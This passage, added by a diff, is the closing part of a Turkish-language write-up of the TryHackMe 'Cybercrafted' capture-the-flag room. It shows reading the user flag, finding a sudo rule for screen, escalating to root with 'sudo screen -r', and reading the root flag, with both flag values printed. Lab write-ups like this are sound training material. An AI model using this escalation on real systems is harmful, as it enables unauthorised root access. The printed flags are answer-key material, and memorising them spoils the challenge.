@@ -774,4 +774,46 @@ Session completed
 ```
  Hash'i kırmayı başardık.
 
+cybercrafted kullanıcısıyla giriş yapalım ve user bayrağını bulalım.
 
+```
+cybercrafted@cybercrafted:~$ ls
+user.txt
+cybercrafted@cybercrafted:~$ cat user.txt 
+THM{b4aa20aaf08f174473ab0325b24a45ca}
+cybercrafted@cybercrafted:~$
+```
+
+Sırada yetki yükseltmek kaldı.
+
+```
+cybercrafted@cybercrafted:~$ sudo -l
+[sudo] password for cybercrafted: 
+Matching Defaults entries for cybercrafted on cybercrafted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cybercrafted may run the following commands on cybercrafted:
+    (root) /usr/bin/screen -r cybercrafted
+cybercrafted@cybercrafted:~$ 
+```
+
+https://linuxize.com/post/how-to-use-linux-screen/
+
+```
+sudo /usr/bin/screen -r cybercrafted
+```
+
+Yetkimizi yükseltip root olduğumuza göre root bayrağını alabiliriz.
+
+```
+# whoami
+root
+# ls    
+root.txt
+# cat root.txt
+THM{8bb1eda065ceefb5795a245568350a70}
+# 
+```
+
+
+Ve böylelikle bir ctf daha tamamladık gelecek yazılarımda görüşmek üzere.
